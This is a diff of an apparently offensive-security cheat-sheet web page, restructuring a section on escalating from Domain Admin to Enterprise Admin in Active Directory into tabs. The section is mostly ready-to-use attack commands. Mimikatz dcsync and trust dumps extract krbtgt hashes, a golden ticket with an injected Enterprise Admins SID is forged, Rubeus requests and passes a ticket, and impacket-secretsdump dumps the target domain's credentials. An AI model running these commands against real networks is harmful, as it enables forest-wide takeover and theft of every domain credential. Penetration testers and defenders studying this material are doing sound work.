@@ -212,30 +212,55 @@
 
 <div class="content"><hr>
 <h3 id="privesc-from-da-domain-admin-to-ea-enterprise-admin">Privesc from DA (Domain Admin) to EA (Enterprise Admin)</h3>
-<h4 id="1-check-trust-relationships">1. Check trust relationships</h4>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-check-trust-relationships">1. Check trust relationships</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Get all trusted domain objects in a forest</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Get-ADTrust</span> <span class="n">-Filter</span> <span class="p">*</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Returns a list of trusted domains</span>
 </span></span><span class="line"><span class="cl"><span class="n">nltest</span> <span class="p">/</span><span class="n">domain_trusts</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Gets a collection of the trust relationships of the current forest</span>
 </span></span><span class="line"><span class="cl"><span class="p">([</span><span class="no">System.DirectoryServices.ActiveDirectory.Domain</span><span class="p">]::</span><span class="n">GetCurrentDomain</span><span class="p">()).</span><span class="py">GetAllTrustRelationships</span><span class="p">()</span>
-</span></span></code></pre></div><h4 id="2-get-current-and-target-domain-sid">2. Get current and target domain SID</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-get-current-and-target-domain-sid">2. Get current and target domain SID</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;lsadump::trust&#39;</span> <span class="s1">&#39;exit&#39;</span>
-</span></span></code></pre></div><h4 id="3-get-krbtgt-hash-of-current-domain">3. Get krbtgt hash of current domain</h4>
+</span></span></code></pre></div></div>
+<h4 id="3-get-krbtgt-hash-of-current-domain">3. Get krbtgt hash of current domain</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;lsadump::dcsync /all /csv&#39;</span> <span class="s1">&#39;exit&#39;</span>
-</span></span></code></pre></div><h4 id="4-forge-a-golden-ticket">4. Forge a golden ticket</h4>
+</span></span></code></pre></div></div>
+<h4 id="4-forge-a-golden-ticket">4. Forge a golden ticket</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Append &#39;-519&#39; to target domain SID</span>
 </span></span><span class="line"><span class="cl"><span class="p">./</span><span class="n">mimikatz</span><span class="p">.</span><span class="py">exe</span> <span class="s1">&#39;kerberos::golden /user:Administrator /rc4:&lt;HASH&gt; /domain:&lt;CURRENT_DOMAIN&gt; /sid:&lt;CURRENT_DOMAIN_SID&gt; /sids:&lt;TARGET_DOMAIN_SID&gt;-519 /ticket:C:\ProgramData\ticket.kirbi&#39;</span> <span class="s1">&#39;exit&#39;</span>
 </span></span></code></pre></div><p><small><em>Note: Try different high value hashes if failed</em></small></p>
+</div>
 <h4 id="5-request-a-tgt-ticket-of-target-domain">5. Request a tgt ticket of target domain</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/&lt;</span><span class="n">TARGET_DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ticket</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ticket_2</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">nowrap</span>
-</span></span></code></pre></div><h4 id="6-convert-kirbi-to-ccache-back-to-linux">6. Convert kirbi to ccache (Back to Linux)</h4>
-<p><a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></p>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="err">:</span><span class="n">cifs</span><span class="p">/&lt;</span><span class="n">TARGET_DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="p">&lt;</span><span class="n">DC</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ticket</span><span class="err">:</span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ticket</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">\</span><span class="n">ticket_2</span><span class="p">.</span><span class="py">kirbi</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span></code></pre></div></div></div></p>
+<h4 id="6-secrets-dump">6. Secrets Dump</h4>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-convert-kirbi-to-ccache">1. Convert kirbi to ccache</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 rubeustoccache.py &lt;BASE64_TICKET_2&gt; secrets.kirbi secrets.ccache
-</span></span></code></pre></div><h4 id="7-secrets-dump">7. Secrets Dump</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-secrets-dump">2. Secrets Dump</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>secrets.ccache
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/SolomonSklash/RubeusToCcache">RubeusToCcache</a></em></small></p></div></p>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2">TO-DO</div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
